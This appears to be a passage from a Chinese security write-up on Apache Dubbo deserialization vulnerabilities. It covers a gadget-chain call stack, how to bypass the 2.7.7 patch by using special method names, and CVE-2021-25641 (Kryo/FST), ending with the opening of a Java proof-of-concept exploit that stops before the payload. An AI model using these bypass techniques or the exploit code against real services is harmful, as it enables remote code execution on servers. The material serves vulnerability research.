readObject(Class):2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)
24
readObject(Class):92, Hessian2ObjectInput
(org.apache.dubbo.common.serialize.hessian2)
25
26
27
//RpcInvocation对象的作用是数据传递，告诉服务端调用哪个函数，参数是多少，参数的类型
是什么。
28
decode(Channel, InputStream):139, DecodeableRpcInvocation
(org.apache.dubbo.rpc.protocol.dubbo)
29
decode():79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
30
decode(Object):57, DecodeHandler (org.apache.dubbo.remoting.transport)
31
received(Channel, Object):44, DecodeHandler (org.apache.dubbo.remoting.trans
port)
32
run():57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatch
er)
33
runWorker(ThreadPoolExecutor$Worker):1142, ThreadPoolExecutor (java.util.con
current)
34
run():617, ThreadPoolExecutor$Worker (java.util.concurrent)
35
run():745, Thread (java.lang)
36
情况二：
这里我就直接把不同的地方写出来了（其实除了sink点是一样的，其余基本都不一样，这里还
是挑重点的地方说吧）
首先就是最重要的dubbo-
2.7.3.jar!\org\apache\dubbo\rpc\protocol\dubbo\DubboProtocol.class的getInvoker方
法，这里对未找到service而抛出异常
然后我们跟进到抛异常的函数中去，其中inv是DecodeableRpcInvocation的实例对象，在这里
会默认调用其toString方法
然后我们继续看会如何处理toString方法的
emmmm，朴实无华
好，还是比较关键的调用链是
1
connect():624, JdbcRowSetImpl (com.sun.rowset)//发起DNS请求的地方
2
getDatabaseMetaData():4004, JdbcRowSetImpl (com.sun.rowset)
3
invoke0(Method, Object, Object[]):‐1, NativeMethodAccessorImpl (sun.reflect)
4
invoke(Object, Object[]):62, NativeMethodAccessorImpl (sun.reflect)
5
invoke(Object, Object[]):43, DelegatingMethodAccessorImpl (sun.reflect)
6
invoke(Object, Object[]):498, Method (java.lang.reflect)
7
8
toString(String):158, ToStringBean (com.rometools.rome.feed.impl)//toString函
数的基本逻辑是：遍历对象的所有属性，调用属性对应的getter函数获取到属性的值，然后转换成
字符串打印出来。
9
toString():129, ToStringBean (com.rometools.rome.feed.impl) //把当前对象转换为S
tring。完全符合中间链接类的特征，被他人调用，然后逻辑中有invoke()可跳转其他类的其他函
数。
10
11
12
valueOf(Object):2994, String (java.lang)
13
toString(Object[]):4571, Arrays (java.util)
14
toString():429, RpcInvocation (org.apache.dubbo.rpc)//为了将RpcInvocation对象
转为字符串，就需要将其内部属性都转换为字符串，就去遍历对象的属性，调用其toString()函数
15
valueOf(Object):2994, String (java.lang)
16
append(Object):131, StringBuilder (java.lang)//这几个函数调用都可以不看，反正就
是为了获取到字符串。
17
18
19
//这里是关键步骤：为了输出错误信息，需要将RpcInvocation对象转为字符串。这个步骤导致
了不需要hessian的反序列化过程。
20
getInvoker(Channel, Invocation):265, DubboProtocol (org.apache.dubbo.rpc.pro
tocol.dubbo) //这个函数进入到了错误处理逻辑，错误输出是将各个对象转换成字符串然后输
出。
21
reply(ExchangeChannel, Object):120, DubboProtocol$1 (org.apache.dubbo.rpc.pr
otocol.dubbo)// 收到的对象是一个RpcInvocation对象
22
handleRequest(ExchangeChannel, Request):100, HeaderExchangeHandler (org.apac
he.dubbo.remoting.exchange.support.header)
23
received(Channel, Object):175, HeaderExchangeHandler (org.apache.dubbo.remot
ing.exchange.support.header)
24
received(Channel, Object):51, DecodeHandler (org.apache.dubbo.remoting.trans
port)//1、dubbo收到客户端的请求，开始decode处理
25
run():57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatch
er)
26
runWorker(ThreadPoolExecutor$Worker):1142, ThreadPoolExecutor (java.util.con
current)
27
run():617, ThreadPoolExecutor$Worker (java.util.concurrent)
28
run():745, Thread (java.lang)
0x04-4 补丁绕过分析
这次针对该漏洞的补丁代码非常简单，在分析该漏洞时说过在DecodeableRpcInvocation类的有
一个if 判断，以下是2.7.3版本中该获取的代码
更新后的2.7.7版本该判断的代码如下，可见在该判断内有增加了一个if 判断，且新增加的判
断如果判断失败则会抛出IllegalArgumentException异常终止当前线程的执行。
那么如何绕过该判断让程序继续执行下去从而触发远程代码执行，我们跟入
RpcUtils.isGenericCall()方法中来仔细观察。
不难发现该方法内用仅仅只用String.equals方法对比了method参数是否和INVOKE_ASYNC常
量的值相同。
我们此时 method的值并不相同，紧接着进入RpcUtils.isEcho()方法，同样是和常量进行
对比，显然结果也不相同
所以if 判断内的最终结果为true，从而抛出异常终止执行。绕过的方法相比大家也都想到
了，我们只要让method的值等于“$invoke”，“$invokeAsync”，“$echo”任意一个即可绕
过。
0x04-5 漏洞利用方面（实战方面）
这个洞相较于19年的洞的利用条件小很多了，所以基本实战理论上还是很常用的（个人见
解，毕竟我还是个没毕业的小白）
0x05 CVE-2021-25641 Dubbo Kryo/FST反序列化漏洞分析
0x05-0 漏洞介绍
Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用
Hessian2序列化格式进行对象传输的，但是针对Hessian2序列化格式的对象传输可能会有黑白
名单设置的限制，参考：https://github.com/apache/dubbo/pull/6378
针对这种场景，攻击者可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或
FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制
来达到RCE。
0x05-1 影响范围
Dubbo 2.7.0 to 2.7.8
Dubbo 2.6.0 to 2.6.9
Dubbo all 2.5.x versions (not supported by official team any longer)
0x05-2 漏洞知识点
1.这个测试是用的低版本自带的fastjson
0x05-3 漏洞调试
本文使用Poc
1
import com.alibaba.fastjson.JSONObject;
2
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
3
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
4
import com.sun.org.apache.xpath.internal.objects.XString;
5
import javassist.ClassPool;
6
import javassist.CtClass;
7
import org.apache.dubbo.common.io.Bytes;
8
import org.apache.dubbo.common.serialize.Serialization;
9
import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
10
import org.apache.dubbo.common.serialize.fst.FstSerialization;
11
import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
12
import org.apache.dubbo.common.serialize.kryo.KryoSerialization;
13
import org.apache.dubbo.common.serialize.ObjectOutput;
14
import org.apache.dubbo.rpc.RpcInvocation;
15
import org.springframework.aop.target.HotSwappableTargetSource;
16
import java.io.ByteArrayOutputStream;
17
import java.io.IOException;
18
import java.io.OutputStream;
19
import java.io.Serializable;
20
import java.lang.reflect.*;
21
import java.net.Socket;
22
import java.util.HashMap;
23
import java.util.HashSet;
24
25
class FstAndKryoGadget {
26
 // Customize URL for remote targets
27
 public static String DUBBO_HOST_NAME = "localhost";
28
 public static int DUBBO_HOST_PORT = 12345;
29
30
 //Exploit variant ‐ comment to switch exploit variants
31
 //public static String EXPLOIT_VARIANT = "Kryo";
32
 public static String EXPLOIT_VARIANT = "FST";
33
34
 // Magic header from ExchangeCodec
35
 protected static final short MAGIC = (short) 0xdabb;
36
 protected static final byte MAGIC_HIGH = Bytes.short2bytes(MAGIC)[0];
37
 protected static final byte MAGIC_LOW = Bytes.short2bytes(MAGIC)[1];
38
39
 // Message flags from ExchangeCodec
40
 protected static final byte FLAG_REQUEST = (byte) 0x80;
41
 protected static final byte FLAG_TWOWAY = (byte) 0x40;
42
43
44
 public static void setAccessible(AccessibleObject member) {
45
 // quiet runtime warnings from JDK9+
46
 member.setAccessible(true);
47
 }
48
49
 public static Field getField(final Class clazz, final String fieldName)
{
50
 Field field = null;
51
 try {
52
 field = clazz.getDeclaredField(fieldName);
53
 setAccessible(field);
54
 }
55
 catch (NoSuchFieldException ex) {
56
 if (clazz.getSuperclass() != null)
57
 field = getField(clazz.getSuperclass(), fieldName);
58
 }
59
 return field;
60
 }
61
62
 public static void setFieldValue(final Object obj, final String fieldName,
final Object value) throws Exception {
63
 final Field field = getField(obj.getClass(), fieldName);
64
 field.set(obj, value);
65
 }
66
67
68